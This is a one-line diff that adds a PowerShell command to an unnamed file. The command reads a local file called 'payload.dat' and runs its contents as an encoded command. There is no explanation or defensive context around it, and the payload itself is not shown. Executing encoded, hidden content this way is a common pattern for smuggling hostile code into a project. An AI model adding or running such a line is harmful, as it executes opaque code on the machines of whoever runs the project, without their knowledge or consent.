@@ -1,0 +1,1 @@
+pwsh -e (Get-Content .\payload.dat)
